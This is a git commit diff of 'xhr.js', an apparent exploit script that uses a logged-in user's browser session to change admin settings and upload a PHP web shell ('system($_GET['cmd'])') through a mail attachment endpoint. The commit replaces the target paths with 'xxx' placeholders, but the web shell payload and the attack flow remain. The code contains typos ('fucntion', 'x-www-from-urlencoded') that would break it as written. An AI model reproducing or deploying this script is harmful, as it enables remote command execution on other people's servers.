3a2edb3d4ca8b249e830a64d47cdcd24544950d6
d0gukank <dogukankaraciger@gmail.com>
2020-05-06 01:16:57 +0300

    Update xhr.js

--- xhr.js
+++ xhr.js
@@ -3,7 +3,7 @@ var target = document.location.host;
 fucntion pwnSettingtmpFolderBaseName(){
 
 	var xhttp = new XMLHttpRequest();
-	xhttp.open("POST", "http://"+ target + "/index.php/admin/settings/globalsave", true);
+	xhttp.open("POST", "http://"+ target + "xxx", true);
 	xhttp.setRequestHeader("Content-type", "application/x-www-from-urlencoded");
 	xhttp.send("save=1&fields[sql_user]=root&fields[tmpFolderBaseName]=");
 }
@@ -13,14 +13,14 @@ function uploadAllTheThings(){
 	var phpKode = "<?php system($_GET['cmd']); ?>";
 	var fileSize = phpKode.length;
 	var boundary = "-------------------270883142628617";
-	var uri = "http://" + target + "/index.php/mail/composemessage/addattachment/composeID";
+	var uri = "http://" + target + "xxxxx";
 	xhr = new XMLHttpRequest();
 	xhr.open("POST", uri, true);
 	xhr.setRequestHeader("Content-Type", "multipart/form-data; boundary="+boundary);
 	xhr.withCredentials = "true";
 	var body = "";
 	body += "--" + boundary + "\r\n";
-	body += 'Content-Disposition: form-data; name="newAttachment"; filename="offsec.php"\r\n';
+	body += 'Content-Disposition: form-data; name="newAttachment"; filename="xxx.php"\r\n';
 	body += "Content-Type: \r\n\r\n";
 	body += phpKode + "\r\n";
 	body += "--" + boundary + "--";
